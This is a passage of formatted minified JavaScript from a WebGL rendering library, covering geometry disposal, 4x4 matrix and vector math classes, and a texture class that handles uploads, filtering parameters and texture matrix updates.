                this.gl.ARRAY_BUFFER,
                this.attributes[t].buffer
              ),
              this.gl.vertexAttribPointer(
                this.attributes[t].location,
                this.attributes[t].size,
                this.gl.FLOAT,
                !1,
                0,
                0
              );
        this.renderer.state.currentGeometryID = this.definition.id;
      }
      draw() {
        this.gl.drawArrays(
          this.gl.TRIANGLES,
          0,
          this.attributes.vertexPosition.numberOfItems
        );
      }
      dispose() {
        this._vao &&
          (this.renderer._isWebGL2
            ? this.gl.deleteVertexArray(this._vao)
            : this.renderer.extensions.OES_vertex_array_object.deleteVertexArrayOES(
                this._vao
              ));
        for (const t in this.attributes)
          this.gl.bindBuffer(this.gl.ARRAY_BUFFER, this.attributes[t].buffer),
            this.gl.bufferData(this.gl.ARRAY_BUFFER, 1, this.gl.STATIC_DRAW),
            this.gl.deleteBuffer(this.attributes[t].buffer);
        (this.attributes = null),
          (this.renderer.state.currentGeometryID = null);
      }
    }
    class Y {
      constructor(
        t = new Float32Array([1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1])
      ) {
        (this.type = "Mat4"), (this.elements = t);
      }
      setFromArray(t) {
        for (let e = 0; e < this.elements.length; e++) this.elements[e] = t[e];
        return this;
      }
      copy(t) {
        const e = t.elements;
        return (
          (this.elements[0] = e[0]),
          (this.elements[1] = e[1]),
          (this.elements[2] = e[2]),
          (this.elements[3] = e[3]),
          (this.elements[4] = e[4]),
          (this.elements[5] = e[5]),
          (this.elements[6] = e[6]),
          (this.elements[7] = e[7]),
          (this.elements[8] = e[8]),
          (this.elements[9] = e[9]),
          (this.elements[10] = e[10]),
          (this.elements[11] = e[11]),
          (this.elements[12] = e[12]),
          (this.elements[13] = e[13]),
          (this.elements[14] = e[14]),
          (this.elements[15] = e[15]),
          this
        );
      }
      clone() {
        return new Y().copy(this);
      }
      multiply(t) {
        const e = this.elements,
          r = t.elements;
        let i = new Y();
        return (
          (i.elements[0] =
            r[0] * e[0] + r[1] * e[4] + r[2] * e[8] + r[3] * e[12]),
          (i.elements[1] =
            r[0] * e[1] + r[1] * e[5] + r[2] * e[9] + r[3] * e[13]),
          (i.elements[2] =
            r[0] * e[2] + r[1] * e[6] + r[2] * e[10] + r[3] * e[14]),
          (i.elements[3] =
            r[0] * e[3] + r[1] * e[7] + r[2] * e[11] + r[3] * e[15]),
          (i.elements[4] =
            r[4] * e[0] + r[5] * e[4] + r[6] * e[8] + r[7] * e[12]),
          (i.elements[5] =
            r[4] * e[1] + r[5] * e[5] + r[6] * e[9] + r[7] * e[13]),
          (i.elements[6] =
            r[4] * e[2] + r[5] * e[6] + r[6] * e[10] + r[7] * e[14]),
          (i.elements[7] =
            r[4] * e[3] + r[5] * e[7] + r[6] * e[11] + r[7] * e[15]),
          (i.elements[8] =
            r[8] * e[0] + r[9] * e[4] + r[10] * e[8] + r[11] * e[12]),
          (i.elements[9] =
            r[8] * e[1] + r[9] * e[5] + r[10] * e[9] + r[11] * e[13]),
          (i.elements[10] =
            r[8] * e[2] + r[9] * e[6] + r[10] * e[10] + r[11] * e[14]),
          (i.elements[11] =
            r[8] * e[3] + r[9] * e[7] + r[10] * e[11] + r[11] * e[15]),
          (i.elements[12] =
            r[12] * e[0] + r[13] * e[4] + r[14] * e[8] + r[15] * e[12]),
          (i.elements[13] =
            r[12] * e[1] + r[13] * e[5] + r[14] * e[9] + r[15] * e[13]),
          (i.elements[14] =
            r[12] * e[2] + r[13] * e[6] + r[14] * e[10] + r[15] * e[14]),
          (i.elements[15] =
            r[12] * e[3] + r[13] * e[7] + r[14] * e[11] + r[15] * e[15]),
          i
        );
      }
      getInverse() {
        const t = this.elements,
          e = new Y(),
          r = e.elements;
        let i = t[0],
          n = t[1],
          s = t[2],
          o = t[3],
          a = t[4],
          l = t[5],
          h = t[6],
          u = t[7],
          c = t[8],
          d = t[9],
          p = t[10],
          f = t[11],
          g = t[12],
          m = t[13],
          _ = t[14],
          v = t[15],
          y = i * l - n * a,
          D = i * h - s * a,
          x = i * u - o * a,
          b = n * h - s * l,
          w = n * u - o * l,
          T = s * u - o * h,
          S = c * m - d * g,
          E = c * _ - p * g,
          C = c * v - f * g,
          P = d * _ - p * m,
          F = d * v - f * m,
          M = p * v - f * _,
          R = y * M - D * F + x * P + b * C - w * E + T * S;
        return R
          ? ((R = 1 / R),
            (r[0] = (l * M - h * F + u * P) * R),
            (r[1] = (s * F - n * M - o * P) * R),
            (r[2] = (m * T - _ * w + v * b) * R),
            (r[3] = (p * w - d * T - f * b) * R),
            (r[4] = (h * C - a * M - u * E) * R),
            (r[5] = (i * M - s * C + o * E) * R),
            (r[6] = (_ * x - g * T - v * D) * R),
            (r[7] = (c * T - p * x + f * D) * R),
            (r[8] = (a * F - l * C + u * S) * R),
            (r[9] = (n * C - i * F - o * S) * R),
            (r[10] = (g * w - m * x + v * y) * R),
            (r[11] = (d * x - c * w - f * y) * R),
            (r[12] = (l * E - a * P - h * S) * R),
            (r[13] = (i * P - n * E + s * S) * R),
            (r[14] = (m * D - g * b - _ * y) * R),
            (r[15] = (c * b - d * D + p * y) * R),
            e)
          : null;
      }
      scale(t) {
        let e = this.elements,
          r = new Y();
        return (
          (r.elements[0] = t.x * e[0]),
          (r.elements[1] = t.x * e[1]),
          (r.elements[2] = t.x * e[2]),
          (r.elements[3] = t.x * e[3]),
          (r.elements[4] = t.y * e[4]),
          (r.elements[5] = t.y * e[5]),
          (r.elements[6] = t.y * e[6]),
          (r.elements[7] = t.y * e[7]),
          (r.elements[8] = t.z * e[8]),
          (r.elements[9] = t.z * e[9]),
          (r.elements[10] = t.z * e[10]),
          (r.elements[11] = t.z * e[11]),
          e !== r.elements &&
            ((r.elements[12] = e[12]),
            (r.elements[13] = e[13]),
            (r.elements[14] = e[14]),
            (r.elements[15] = e[15])),
          r
        );
      }
      composeFromOrigin(t, e, r, i) {
        let n = this.elements;
        const s = e.elements[0],
          o = e.elements[1],
          a = e.elements[2],
          l = e.elements[3],
          h = s + s,
          u = o + o,
          c = a + a,
          d = s * h,
          p = s * u,
          f = s * c,
          g = o * u,
          m = o * c,
          _ = a * c,
          v = l * h,
          y = l * u,
          D = l * c,
          x = r.x,
          b = r.y,
          w = r.z,
          T = i.x,
          S = i.y,
          E = i.z,
          C = (1 - (g + _)) * x,
          P = (p + D) * x,
          F = (f - y) * x,
          M = (p - D) * b,
          R = (1 - (d + _)) * b,
          A = (m + v) * b,
          O = (f + y) * w,
          k = (m - v) * w,
          L = (1 - (d + g)) * w;
        return (
          (n[0] = C),
          (n[1] = P),
          (n[2] = F),
          (n[3] = 0),
          (n[4] = M),
          (n[5] = R),
          (n[6] = A),
          (n[7] = 0),
          (n[8] = O),
          (n[9] = k),
          (n[10] = L),
          (n[11] = 0),
          (n[12] = t.x + T - (C * T + M * S + O * E)),
          (n[13] = t.y + S - (P * T + R * S + k * E)),
          (n[14] = t.z + E - (F * T + A * S + L * E)),
          (n[15] = 1),
          this
        );
      }
    }
    class G {
      constructor(t = 0, e = 0) {
        (this.type = "Vec2"), this.set(t, e);
      }
      set(t, e) {
        return (this.x = t), (this.y = e), this;
      }
      add(t) {
        return (this.x += t.x), (this.y += t.y), this;
      }
      addScalar(t) {
        return (this.x += t), (this.y += t), this;
      }
      sub(t) {
        return (this.x -= t.x), (this.y -= t.y), this;
      }
      subScalar(t) {
        return (this.x -= t), (this.y -= t), this;
      }
      multiply(t) {
        return (this.x *= t.x), (this.y *= t.y), this;
      }
      multiplyScalar(t) {
        return (this.x *= t), (this.y *= t), this;
      }
      copy(t) {
        return (this.x = t.x), (this.y = t.y), this;
      }
      clone() {
        return new G(this.x, this.y);
      }
      sanitizeNaNValuesWith(t) {
        return (
          (this.x = isNaN(this.x) ? t.x : parseFloat(this.x)),
          (this.y = isNaN(this.y) ? t.y : parseFloat(this.y)),
          this
        );
      }
      max(t) {
        return (
          (this.x = Math.max(this.x, t.x)),
          (this.y = Math.max(this.y, t.y)),
          this
        );
      }
      min(t) {
        return (
          (this.x = Math.min(this.x, t.x)),
          (this.y = Math.min(this.y, t.y)),
          this
        );
      }
      equals(t) {
        return this.x === t.x && this.y === t.y;
      }
      normalize() {
        let t = this.x * this.x + this.y * this.y;
        return (
          t > 0 && (t = 1 / Math.sqrt(t)), (this.x *= t), (this.y *= t), this
        );
      }
      dot(t) {
        return this.x * t.x + this.y * t.y;
      }
    }
    class K {
      constructor(t = 0, e = 0, r = 0) {
        (this.type = "Vec3"), this.set(t, e, r);
      }
      set(t, e, r) {
        return (this.x = t), (this.y = e), (this.z = r), this;
      }
      add(t) {
        return (this.x += t.x), (this.y += t.y), (this.z += t.z), this;
      }
      addScalar(t) {
        return (this.x += t), (this.y += t), (this.z += t), this;
      }
      sub(t) {
        return (this.x -= t.x), (this.y -= t.y), (this.z -= t.z), this;
      }
      subScalar(t) {
        return (this.x -= t), (this.y -= t), (this.z -= t), this;
      }
      multiply(t) {
        return (this.x *= t.x), (this.y *= t.y), (this.z *= t.z), this;
      }
      multiplyScalar(t) {
        return (this.x *= t), (this.y *= t), (this.z *= t), this;
      }
      copy(t) {
        return (this.x = t.x), (this.y = t.y), (this.z = t.z), this;
      }
      clone() {
        return new K(this.x, this.y, this.z);
      }
      sanitizeNaNValuesWith(t) {
        return (
          (this.x = isNaN(this.x) ? t.x : parseFloat(this.x)),
          (this.y = isNaN(this.y) ? t.y : parseFloat(this.y)),
          (this.z = isNaN(this.z) ? t.z : parseFloat(this.z)),
          this
        );
      }
      max(t) {
        return (
          (this.x = Math.max(this.x, t.x)),
          (this.y = Math.max(this.y, t.y)),
          (this.z = Math.max(this.z, t.z)),
          this
        );
      }
      min(t) {
        return (
          (this.x = Math.min(this.x, t.x)),
          (this.y = Math.min(this.y, t.y)),
          (this.z = Math.min(this.z, t.z)),
          this
        );
      }
      equals(t) {
        return this.x === t.x && this.y === t.y && this.z === t.z;
      }
      normalize() {
        let t = this.x * this.x + this.y * this.y + this.z * this.z;
        return (
          t > 0 && (t = 1 / Math.sqrt(t)),
          (this.x *= t),
          (this.y *= t),
          (this.z *= t),
          this
        );
      }
      dot(t) {
        return this.x * t.x + this.y * t.y + this.z * t.z;
      }
      applyMat4(t) {
        const e = this.x,
          r = this.y,
          i = this.z,
          n = t.elements;
        let s = n[3] * e + n[7] * r + n[11] * i + n[15];
        return (
          (s = s || 1),
          (this.x = (n[0] * e + n[4] * r + n[8] * i + n[12]) / s),
          (this.y = (n[1] * e + n[5] * r + n[9] * i + n[13]) / s),
          (this.z = (n[2] * e + n[6] * r + n[10] * i + n[14]) / s),
          this
        );
      }
      applyQuat(t) {
        const e = this.x,
          r = this.y,
          i = this.z,
          n = t.elements[0],
          s = t.elements[1],
          o = t.elements[2],
          a = t.elements[3],
          l = a * e + s * i - o * r,
          h = a * r + o * e - n * i,
          u = a * i + n * r - s * e,
          c = -n * e - s * r - o * i;
        return (
          (this.x = l * a + c * -n + h * -o - u * -s),
          (this.y = h * a + c * -s + u * -n - l * -o),
          (this.z = u * a + c * -o + l * -s - h * -n),
          this
        );
      }
      project(t) {
        return this.applyMat4(t.viewMatrix).applyMat4(t.projectionMatrix), this;
      }
      unproject(t) {
        return (
          this.applyMat4(t.projectionMatrix.getInverse()).applyMat4(
            t.worldMatrix
          ),
          this
        );
      }
    }
    class Q {
      constructor(
        t,
        {
          isFBOTexture: e = !1,
          fromTexture: r = !1,
          loader: i,
          sampler: n,
          floatingPoint: s = "none",
          premultiplyAlpha: o = !1,
          anisotropy: a = 1,
          generateMipmap: l = null,
          wrapS: h,
          wrapT: u,
          minFilter: c,
          magFilter: d,
        } = {}
      ) {
        if (
          ((this.type = "Texture"),
          (t = (t && t.renderer) || t) && "Renderer" === t.type
            ? t.gl || P(this.type + ": Renderer WebGL context is undefined", t)
            : P(this.type + ": Renderer not passed as first argument", t),
          (this.renderer = t),
          (this.gl = this.renderer.gl),
          (this.uuid = F()),
          (this._globalParameters = {
            unpackAlignment: 4,
            flipY: !e,
            premultiplyAlpha: o,
            floatingPoint: s,
            type: this.gl.UNSIGNED_BYTE,
            internalFormat: this.gl.RGBA,
            format: this.gl.RGBA,
          }),
          (this.parameters = {
            anisotropy: a,
            generateMipmap: l,
            wrapS: h || this.gl.CLAMP_TO_EDGE,
            wrapT: u || this.gl.CLAMP_TO_EDGE,
            minFilter: c || this.gl.LINEAR,
            magFilter: d || this.gl.LINEAR,
            _shouldUpdate: !0,
          }),
          this._initState(),
          (this.sourceType = e ? "fbo" : "empty"),
          (this._samplerName = n),
          (this._sampler = { isActive: !1 }),
          (this._textureMatrix = { matrix: new Y() }),
          (this._size = { width: 0, height: 0 }),
          (this.scale = new G(1, 1)),
          (this.offset = new G()),
          (this._loader = i),
          (this._sourceLoaded = !1),
          (this._uploaded = !1),
          (this._willUpdate = !1),
          (this.shouldUpdate = !1),
          (this._forceUpdate = !1),
          (this.userData = {}),
          (this._canDraw = !1),
          r)
        )
          return (this._copyOnInit = !0), void (this._copiedFrom = r);
        (this._copyOnInit = !1), this._initTexture();
      }
      _initState() {
        this._state = {
          anisotropy: 1,
          generateMipmap: !1,
          wrapS: null,
          wrapT: null,
          minFilter: null,
          magFilter: this.gl.LINEAR,
        };
      }
      _initTexture() {
        (this._sampler.texture = this.gl.createTexture()),
          this.gl.bindTexture(this.gl.TEXTURE_2D, this._sampler.texture),
          "empty" === this.sourceType &&
            ((this._globalParameters.flipY = !1),
            this._updateGlobalTexParameters(),
            this.gl.texImage2D(
              this.gl.TEXTURE_2D,
              0,
              this.gl.RGBA,
              1,
              1,
              0,
              this.gl.RGBA,
              this.gl.UNSIGNED_BYTE,
              new Uint8Array([0, 0, 0, 255])
            ),
            (this._canDraw = !0));
      }
      _restoreFromTexture() {
        this._copyOnInit || this._initTexture(),
          this._parent && (this._setTextureUniforms(), this._setSize()),
          this.copy(this._copiedFrom),
          (this._canDraw = !0);
      }
      _restoreContext() {
        if (
          ((this._canDraw = !1),
          (this._sampler.isActive = !1),
          this._initState(),
          (this._state.generateMipmap = !1),
          (this.parameters._shouldUpdate = !0),
          this._copiedFrom)
        ) {
          const t = this.renderer.nextRender.add(() => {
            this._copiedFrom._canDraw &&
              (this._restoreFromTexture(), (t.keep = !1));
          }, !0);
        } else
          this._initTexture(),
            this._parent && this._setParent(),
            this.source &&
              (this.setSource(this.source),
              "image" === this.sourceType
                ? this.renderer.cache.addTexture(this)
                : this.needUpdate()),
            (this._canDraw = !0);
      }
      addParent(t) {
        !t ||
        ("Plane" !== t.type &&
          "PingPongPlane" !== t.type &&
          "ShaderPass" !== t.type &&
          "RenderTarget" !== t.type)
          ? this.renderer.production ||
            C(
              this.type + ": cannot add texture as a child of ",
              t,
              " because it is not a valid parent"
            )
          : ((this._parent = t),
            (this.index = this._parent.textures.length),
            this._parent.textures.push(this),
            this._setParent());
      }
      _setParent() {
        if (
          ((this._sampler.name = this._samplerName || "uSampler" + this.index),
          (this._textureMatrix.name = this._samplerName
            ? this._samplerName + "Matrix"
            : "uTextureMatrix" + this.index),
          this._parent._program)
        ) {
          if (!this._parent._program.compiled)
            return void (
              this.renderer.production ||
              C(
                this.type +
                  ": Unable to create the texture because the program is not valid"
              )
            );
          if ((this._setTextureUniforms(), this._copyOnInit)) {
            this._copiedFrom._sampler.texture ||
              ((this._sampler.texture = this.gl.createTexture()),
              this.gl.bindTexture(this.gl.TEXTURE_2D, this._sampler.texture));
            const t = this.renderer.nextRender.add(() => {
              this._copiedFrom._canDraw &&
                (this.copy(this._copiedFrom), (t.keep = !1));
            }, !0);
            return;
          }
          this.source
            ? this._parent.loader &&
              this._parent.loader._addSourceToParent(
                this.source,
                this.sourceType
              )
            : (this._size = {
                width: this._parent._boundingRect.document.width,
                height: this._parent._boundingRect.document.height,
              }),
            this._setSize();
        } else
          "RenderTarget" === this._parent.type &&
            ((this._size = {
              width:
                (this._parent._size && this._parent._size.width) ||
                this.renderer._boundingRect.width,
              height:
                (this._parent._size && this._parent._size.height) ||
                this.renderer._boundingRect.height,
            }),
            this._upload(),
            this._updateTexParameters(),
            (this._canDraw = !0));
      }
      hasParent() {
        return !!this._parent;
      }
      _setTextureUniforms() {
        for (let t = 0; t < this._parent._program.activeTextures.length; t++)
          this._parent._program.activeTextures[t] === this._sampler.name &&
            ((this._sampler.isActive = !0),
            this.renderer.useProgram(this._parent._program),
            (this._sampler.location = this.gl.getUniformLocation(
              this._parent._program.program,
              this._sampler.name
            )),
            (this._textureMatrix.location = this.gl.getUniformLocation(
              this._parent._program.program,
              this._textureMatrix.name
            )),
            this.gl.uniform1i(this._sampler.location, this.index));
      }
      copy(t) {
        t && "Texture" === t.type
          ? ((this._globalParameters = t._globalParameters),
            (this.parameters = t.parameters),
            (this._state = t._state),
            (this._size = t._size),
            !this._sourceLoaded &&
              t._sourceLoaded &&
              this._onSourceLoadedCallback &&
              this._onSourceLoadedCallback(),
            (this._sourceLoaded = t._sourceLoaded),
            !this._uploaded &&
              t._uploaded &&
              this._onSourceUploadedCallback &&
              this._onSourceUploadedCallback(),
            (this._uploaded = t._uploaded),
            (this.sourceType = t.sourceType),
            (this.source = t.source),
            (this._videoFrameCallbackID = t._videoFrameCallbackID),
            (this._sampler.texture = t._sampler.texture),
            (this._copiedFrom = t),
            !this._parent ||
              !this._parent._program ||
              (this._canDraw && this._textureMatrix.matrix) ||
              (this._setSize(), (this._canDraw = !0)),
            this.renderer.needRender())
          : this.renderer.production ||
            C(this.type + ": Unable to set the texture from texture:", t);
      }
      setSource(t) {
        this._sourceLoaded ||
          this.renderer.nextRender.add(
            () => this._onSourceLoadedCallback && this._onSourceLoadedCallback()
          );
        const e = this.renderer.cache.getTextureFromSource(t);
        if (e)
          return (
            this._uploaded ||
              (this.renderer.nextRender.add(
                () =>
                  this._onSourceUploadedCallback &&
                  this._onSourceUploadedCallback()
              ),
              (this._uploaded = !0)),
            this.copy(e),
            void this.resize()
          );
        (this.source = t),
          "empty" === this.sourceType &&
            ("IMG" === t.tagName.toUpperCase()
              ? (this.sourceType = "image")
              : "VIDEO" === t.tagName.toUpperCase()
              ? ((this.sourceType = "video"), (this.shouldUpdate = !0))
              : "CANVAS" === t.tagName.toUpperCase()
              ? ((this.sourceType = "canvas"),
                (this._willUpdate = !0),
                (this.shouldUpdate = !0))
              : this.renderer.production ||
                C(
                  this.type +
                    ": this HTML tag could not be converted into a texture:",
                  t.tagName
                )),
          (this._size = {
            width:
              this.source.naturalWidth ||
              this.source.width ||
              this.source.videoWidth,
            height:
              this.source.naturalHeight ||
              this.source.height ||
              this.source.videoHeight,
          }),
          (this._sourceLoaded = !0),
          this.gl.bindTexture(this.gl.TEXTURE_2D, this._sampler.texture),
          this.resize(),
          (this._globalParameters.flipY = !0),
          "image" === this.sourceType &&
            ((this.parameters.generateMipmap =
              this.parameters.generateMipmap ||
              null === this.parameters.generateMipmap),
            (this.parameters._shouldUpdate = this.parameters.generateMipmap),
            (this._state.generateMipmap = !1),
            this._upload()),
          this.renderer.needRender();
      }
      _updateGlobalTexParameters() {
        this.renderer.state.unpackAlignment !==
          this._globalParameters.unpackAlignment &&
          (this.gl.pixelStorei(
            this.gl.UNPACK_ALIGNMENT,
            this._globalParameters.unpackAlignment
          ),
          (this.renderer.state.unpackAlignment =
            this._globalParameters.unpackAlignment)),
          this.renderer.state.flipY !== this._globalParameters.flipY &&
            (this.gl.pixelStorei(
              this.gl.UNPACK_FLIP_Y_WEBGL,
              this._globalParameters.flipY
            ),
            (this.renderer.state.flipY = this._globalParameters.flipY)),
          this.renderer.state.premultiplyAlpha !==
            this._globalParameters.premultiplyAlpha &&
            (this.gl.pixelStorei(
              this.gl.UNPACK_PREMULTIPLY_ALPHA_WEBGL,
              this._globalParameters.premultiplyAlpha
            ),
            (this.renderer.state.premultiplyAlpha =
              this._globalParameters.premultiplyAlpha)),
          "half-float" === this._globalParameters.floatingPoint
            ? this.renderer._isWebGL2 &&
              this.renderer.extensions.EXT_color_buffer_float
              ? ((this._globalParameters.internalFormat = this.gl.RGBA16F),
                (this._globalParameters.type = this.gl.HALF_FLOAT))
              : this.renderer.extensions.OES_texture_half_float
              ? (this._globalParameters.type =
                  this.renderer.extensions.OES_texture_half_float.HALF_FLOAT_OES)
              : this.renderer.production ||
                C(
                  this.type +
                    ": could not use half-float textures because the extension is not available"
                )
            : "float" === this._globalParameters.floatingPoint &&
              (this.renderer._isWebGL2 &&
              this.renderer.extensions.EXT_color_buffer_float
                ? ((this._globalParameters.internalFormat = this.gl.RGBA16F),
                  (this._globalParameters.type = this.gl.FLOAT))
                : this.renderer.extensions.OES_texture_float
                ? (this._globalParameters.type =
                    this.renderer.extensions.OES_texture_half_float.FLOAT)
                : this.renderer.production ||
                  C(
                    this.type +
                      ": could not use float textures because the extension is not available"
                  ));
      }
      _updateTexParameters() {
        this.index &&
          this.renderer.state.activeTexture !== this.index &&
          this._bindTexture(this),
          this.parameters.wrapS !== this._state.wrapS &&
            (this.renderer._isWebGL2 ||
              (M(this._size.width) && M(this._size.height)) ||
              (this.parameters.wrapS = this.gl.CLAMP_TO_EDGE),
            this.parameters.wrapS !== this.gl.REPEAT &&
              this.parameters.wrapS !== this.gl.CLAMP_TO_EDGE &&
              this.parameters.wrapS !== this.gl.MIRRORED_REPEAT &&
              (this.renderer.production ||
                C(
                  this.type + ": Wrong wrapS value",
                  this.parameters.wrapS,
                  "for this texture:",
                  this,
                  "\ngl.CLAMP_TO_EDGE wrapping will be used instead"
                ),
              (this.parameters.wrapS = this.gl.CLAMP_TO_EDGE)),
            this.gl.texParameteri(
              this.gl.TEXTURE_2D,
              this.gl.TEXTURE_WRAP_S,
              this.parameters.wrapS
            ),
            (this._state.wrapS = this.parameters.wrapS)),
          this.parameters.wrapT !== this._state.wrapT &&
            (this.renderer._isWebGL2 ||
              (M(this._size.width) && M(this._size.height)) ||
              (this.parameters.wrapT = this.gl.CLAMP_TO_EDGE),
            this.parameters.wrapT !== this.gl.REPEAT &&
              this.parameters.wrapT !== this.gl.CLAMP_TO_EDGE &&
              this.parameters.wrapT !== this.gl.MIRRORED_REPEAT &&
              (this.renderer.production ||
                C(
                  this.type + ": Wrong wrapT value",
                  this.parameters.wrapT,
                  "for this texture:",
                  this,
                  "\ngl.CLAMP_TO_EDGE wrapping will be used instead"
                ),
              (this.parameters.wrapT = this.gl.CLAMP_TO_EDGE)),
            this.gl.texParameteri(
              this.gl.TEXTURE_2D,
              this.gl.TEXTURE_WRAP_T,
              this.parameters.wrapT
            ),
            (this._state.wrapT = this.parameters.wrapT)),
          this.parameters.generateMipmap &&
            !this._state.generateMipmap &&
            this.source &&
            (this.renderer._isWebGL2 ||
            (M(this._size.width) && M(this._size.height))
              ? this.gl.generateMipmap(this.gl.TEXTURE_2D)
              : (this.parameters.generateMipmap = !1),
            (this._state.generateMipmap = this.parameters.generateMipmap)),
          this.parameters.minFilter !== this._state.minFilter &&
            (this.renderer._isWebGL2 ||
              (M(this._size.width) && M(this._size.height)) ||
              (this.parameters.minFilter = this.gl.LINEAR),
            this.parameters.generateMipmap ||
              null === this.parameters.generateMipmap ||
              (this.parameters.minFilter = this.gl.LINEAR),
            this.parameters.minFilter !== this.gl.LINEAR &&
              this.parameters.minFilter !== this.gl.NEAREST &&
              this.parameters.minFilter !== this.gl.NEAREST_MIPMAP_NEAREST &&
              this.parameters.minFilter !== this.gl.LINEAR_MIPMAP_NEAREST &&
              this.parameters.minFilter !== this.gl.NEAREST_MIPMAP_LINEAR &&
              this.parameters.minFilter !== this.gl.LINEAR_MIPMAP_LINEAR &&
              (this.renderer.production ||
                C(
                  this.type + ": Wrong minFilter value",
                  this.parameters.minFilter,
                  "for this texture:",
                  this,
                  "\ngl.LINEAR filtering will be used instead"
                ),
              (this.parameters.minFilter = this.gl.LINEAR)),
            this.gl.texParameteri(
              this.gl.TEXTURE_2D,
              this.gl.TEXTURE_MIN_FILTER,
              this.parameters.minFilter
            ),
            (this._state.minFilter = this.parameters.minFilter)),
          this.parameters.magFilter !== this._state.magFilter &&
            (this.renderer._isWebGL2 ||
              (M(this._size.width) && M(this._size.height)) ||
              (this.parameters.magFilter = this.gl.LINEAR),
            this.parameters.magFilter !== this.gl.LINEAR &&
              this.parameters.magFilter !== this.gl.NEAREST &&
              (this.renderer.production ||
                C(
                  this.type + ": Wrong magFilter value",
                  this.parameters.magFilter,
                  "for this texture:",
                  this,
                  "\ngl.LINEAR filtering will be used instead"
                ),
              (this.parameters.magFilter = this.gl.LINEAR)),
            this.gl.texParameteri(
              this.gl.TEXTURE_2D,
              this.gl.TEXTURE_MAG_FILTER,
              this.parameters.magFilter
            ),
            (this._state.magFilter = this.parameters.magFilter));
        const t = this.renderer.extensions.EXT_texture_filter_anisotropic;
        if (t && this.parameters.anisotropy !== this._state.anisotropy) {
          const e = this.gl.getParameter(t.MAX_TEXTURE_MAX_ANISOTROPY_EXT);
          (this.parameters.anisotropy = Math.max(
            1,
            Math.min(this.parameters.anisotropy, e)
          )),
            this.gl.texParameterf(
              this.gl.TEXTURE_2D,
              t.TEXTURE_MAX_ANISOTROPY_EXT,
              this.parameters.anisotropy
            ),
            (this._state.anisotropy = this.parameters.anisotropy);
        }
      }
      setWrapS(t) {
        this.parameters.wrapS !== t &&
          ((this.parameters.wrapS = t), (this.parameters._shouldUpdate = !0));
      }
      setWrapT(t) {
        this.parameters.wrapT !== t &&
          ((this.parameters.wrapT = t), (this.parameters._shouldUpdate = !0));
      }
      setMinFilter(t) {
        this.parameters.minFilter !== t &&
          ((this.parameters.minFilter = t),
          (this.parameters._shouldUpdate = !0));
      }
      setMagFilter(t) {
        this.parameters.magFilter !== t &&
          ((this.parameters.magFilter = t),
          (this.parameters._shouldUpdate = !0));
      }
      setAnisotropy(t) {
        (t = isNaN(t) ? this.parameters.anisotropy : t),
          this.parameters.anisotropy !== t &&
            ((this.parameters.anisotropy = t),
            (this.parameters._shouldUpdate = !0));
      }
      needUpdate() {
        this._forceUpdate = !0;
      }
      _videoFrameCallback() {
        (this._willUpdate = !0),
          this.source.requestVideoFrameCallback(() =>
            this._videoFrameCallback()
          );
      }
      _upload() {
        this._updateGlobalTexParameters(),
          this.source
            ? this.gl.texImage2D(
                this.gl.TEXTURE_2D,
                0,
                this._globalParameters.internalFormat,
                this._globalParameters.format,
                this._globalParameters.type,
                this.source
              )
            : "fbo" === this.sourceType &&
              this.gl.texImage2D(
                this.gl.TEXTURE_2D,
                0,
                this._globalParameters.internalFormat,
                this._size.width,
                this._size.height,
                0,
                this._globalParameters.format,
                this._globalParameters.type,
                this.source
              ),
          this._uploaded ||
            (this.renderer.nextRender.add(
              () =>
                this._onSourceUploadedCallback &&
                this._onSourceUploadedCallback()
            ),
            (this._uploaded = !0));
      }
      _getSizes() {
        if ("fbo" === this.sourceType)
          return {
            parentWidth: this._parent._boundingRect.document.width,
            parentHeight: this._parent._boundingRect.document.height,
            sourceWidth: this._parent._boundingRect.document.width,
            sourceHeight: this._parent._boundingRect.document.height,
            xOffset: 0,
            yOffset: 0,
          };
        const t = this._parent.scale
            ? new G(this._parent.scale.x, this._parent.scale.y)
            : new G(1, 1),
          e = this._parent._boundingRect.document.width * t.x,
          r = this._parent._boundingRect.document.height * t.y,
          i = this._size.width,
          n = this._size.height,
          s = i / n,
          o = e / r;
        let a = 0,
          l = 0;
        return (
          o > s
            ? (l = Math.min(0, r - e * (1 / s)))
            : o < s && (a = Math.min(0, e - r * s)),
          {
            parentWidth: e,
            parentHeight: r,
            sourceWidth: i,
            sourceHeight: n,
            xOffset: a,
            yOffset: l,
          }
        );
      }
      setScale(t) {
        t.type && "Vec2" === t.type
          ? (t.sanitizeNaNValuesWith(this.scale).max(new G(0.001, 0.001)),
            t.equals(this.scale) || (this.scale.copy(t), this.resize()))
          : this.renderer.production ||
            C(
              this.type +
                ": Cannot set scale because the parameter passed is not of Vec2 type:",
              t
            );
      }
      setOffset(t) {
        t.type && "Vec2" === t.type
          ? (t.sanitizeNaNValuesWith(this.offset),
            t.equals(this.offset) || (this.offset.copy(t), this.resize()))
          : this.renderer.production ||
            C(
              this.type +
                ": Cannot set offset because the parameter passed is not of Vec2 type:",
              scale
            );
      }
      _setSize() {
        if (this._parent && this._parent._program) {
          const t = this._getSizes();
          this._updateTextureMatrix(t);
        }
      }
      resize() {
        "fbo" === this.sourceType
          ? ((this._size = {
              width:
                (this._parent._size && this._parent._size.width) ||
                this._parent._boundingRect.document.width,
              height:
                (this._parent._size && this._parent._size.height) ||
                this._parent._boundingRect.document.height,
            }),
            this._copiedFrom ||
              (this.gl.bindTexture(this.gl.TEXTURE_2D, this._sampler.texture),
              this.gl.texImage2D(
                this.gl.TEXTURE_2D,
                0,
                this._globalParameters.internalFormat,
                this._size.width,
                this._size.height,
                0,
                this._globalParameters.format,
                this._globalParameters.type,
                null
              )))
          : this.source &&
            (this._size = {
              width:
                this.source.naturalWidth ||
                this.source.width ||
                this.source.videoWidth,
              height:
                this.source.naturalHeight ||
                this.source.height ||
                this.source.videoHeight,
            }),
          this._setSize();
      }
      _updateTextureMatrix(t) {
        let e = new K(
          t.parentWidth / (t.parentWidth - t.xOffset),
          t.parentHeight / (t.parentHeight - t.yOffset),
          1
        );
        (e.x /= this.scale.x), (e.y /= this.scale.y);
        const r = new Y([
          1,
          0,
          0,
          0,
          0,
          1,
          0,
          0,
          0,
          0,
          1,
          0,
          (1 - e.x) / 2 + this.offset.x,
          (1 - e.y) / 2 + this.offset.y,
          0,
          1,
        ]);
        (this._textureMatrix.matrix = r.scale(e)), this._updateMatrixUniform();
      }
      _updateMatrixUniform() {
        this.renderer.useProgram(this._parent._program),
          this.gl.uniformMatrix4fv(
            this._textureMatrix.location,
            !1,
            this._textureMatrix.matrix.elements
          );
      }
